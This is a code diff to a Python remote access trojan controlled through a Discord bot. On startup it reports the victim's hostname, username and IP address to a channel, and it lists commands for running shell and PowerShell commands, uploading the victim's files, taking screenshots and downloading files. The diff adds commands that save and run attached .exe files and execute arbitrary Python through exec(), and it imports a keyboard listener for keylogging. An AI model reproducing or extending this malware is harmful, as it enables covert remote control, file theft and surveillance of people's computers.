@@ -1,5 +1,8 @@
 import webbrowser
 import os
+import logging
+import threading
+from pynput.keyboard import Listener
 import getpass
 import discord
 import random
@@ -38,7 +41,7 @@ async def on_command_error(ctx, error):
 @DisFunc.event
 async def on_ready():
     hostname = socket.gethostname()
-    channel = DisFunc.get_channel()  # Replace with your desired channel ID 
+    channel = DisFunc.get_channel(your channel id)  # Replace with your desired channel ID 
     user = getpass.getuser()
     ip = GetIP()
 
@@ -51,7 +54,7 @@ async def on_ready():
     embed.set_footer(text='Credit to [syntheticlol](https://github.com/syntheticlol)')
     await channel.send(embed=embed)
 
-
+    await channel.send("To execute commands, please respond to bot messages.")
 
 
 
@@ -155,28 +158,77 @@ async def ahah(ctx):
 
 
 
-
 @DisFunc.command()
 async def help(ctx):
-    help_message = """
-    **Bot Commands:**
-    ?ps <command> same as cmd but powershell 
-    ?cmd <command> - Execute a command.
-    ?upload <path> <channel_id> - Upload a file from victim to the specified channel cannot accept spaces.
-    ?nano <filepath> nano writes thing inside any file work like nano usage ?nano filepath nano is awesome :D
-    ?screenshot get screenshot victim computer
-    ?furryporn you really do not want to execute this even if victim is your worst enemy
-    ?rickroll same as furryporn but rickroll :D
-    ?usage show cpu and ram usage
-    ?ahah bu ahlayan kadın sesi türklere özel :D
-    ?download download file from link
-    ?website <https://example.com>: Sends the user to a website of choice
-    
-    
-    credit to : https://github.com/syntheticlol
-    """
-    await ctx.send(help_message)
+    embed = discord.Embed(title="Bot Commands", description="List of available commands", color=discord.Color.blue())
 
+    embed.add_field(name="?ps <command>", value="Run a command in PowerShell", inline=False)
+    embed.add_field(name="?cmd <command>", value="Execute a command", inline=False)
+    embed.add_field(name="?upload <path> <channel_id>", value="Upload a file from victim to the specified channel", inline=False)
+    embed.add_field(name="?nano <filepath>", value="Write contents to a file using nano", inline=False)
+    embed.add_field(name="?screenshot", value="Get a screenshot of the victim's computer", inline=False)
+    embed.add_field(name="?furryporn", value="View furry pornography (not recommended)", inline=False)
+    embed.add_field(name="?rickroll", value="Rickroll the victim (not recommended)", inline=False)
+    embed.add_field(name="?usage", value="Show CPU and RAM usage", inline=False)
+    embed.add_field(name="?ahah", value="Special ahlayan kadın sesi for Turkish people", inline=False)
+    embed.add_field(name="?download <link>", value="Download a file from a link", inline=False)
+    embed.add_field(name="?website <url>", value="Sends the user to a website of choice", inline=False)
+    embed.add_field(name="?execpy <python command>", value="Execute a Python command provided by the user", inline=False)
+    embed.add_field(name="?execpyfile", value="Execute a .py file provided by the user", inline=False)
+    embed.add_field(name="?exec <executable file>", value="Execute an executable file provided by the user", inline=False)
+
+    embed.set_footer(text="Credit to: https://github.com/syntheticlol")
+
+    await ctx.send(embed=embed)
+
+
+@DisFunc.command()
+async def exec(ctx):
+    attachment = ctx.message.attachments[0]  # Get the first attachment from the message
+
+    if attachment.filename.endswith(".exe"):  # Check if the attachment has a .exe extension
+        try:
+            file_path = f"temp/{attachment.filename}"  # Define the file path where the attachment will be saved
+            await attachment.save(file_path)  # Save the attachment to the specified file path
+
+            subprocess.Popen(file_path)  # Execute the .exe file using subprocess
+            await ctx.send(f"Executed `{attachment.filename}` successfully.")
+        except Exception as e:
+            await ctx.send(f"An error occurred while executing `{attachment.filename}`:\n```{e}```")
+    else:
+        await ctx.send("The attached file must be an executable (.exe) file.")
+
+
+
+
+@DisFunc.command()
+async def execpyfile(ctx):
+    attachment = ctx.message.attachments[0]  # İlk ek dosyayı al
+
+    if attachment.filename.endswith(".py"):  # Dosya uzantısı .py ise devam et
+        try:
+            code = await attachment.read()  # Dosyayı oku
+            exec(code)  # Kodu çalıştır
+        except Exception as e:
+            await ctx.send(f"An error occurred:\n```{traceback.format_exc()}```")
+    else:
+        await ctx.send("The attached file must be a Python (.py) file.")
+
+
+
+
+
+
+
+
+@DisFunc.command()
+async def execpy(ctx, *, code):
+    try:
+        code_lines = code.split("\n")  # Kodu satırlara ayır
+        for line in code_lines:
+            exec(line)  # Her satırı tek tek çalıştır
+    except Exception as e:
+        await ctx.send(f"An error occurred:\n```{traceback.format_exc()}```")
 
 
 @DisFunc.command()
@@ -193,7 +245,6 @@ async def ps(ctx, *, command):
         await ctx.send(f"An error occurred: {e.output}")
     except Exception as e:
         await ctx.send(f"An error occurred: {str(e)}")
-
 
 
 
@@ -283,7 +334,7 @@ async def screenshot(ctx):
         await ctx.send(f"An error occurred while capturing the screenshot: {str(e)}")
 
 # Replace with your bot token
-loop.create_task(DisFunc.start('your token here'))
+loop.create_task(DisFunc.start('your bot token here'))
 
 try:
     loop.run_forever()
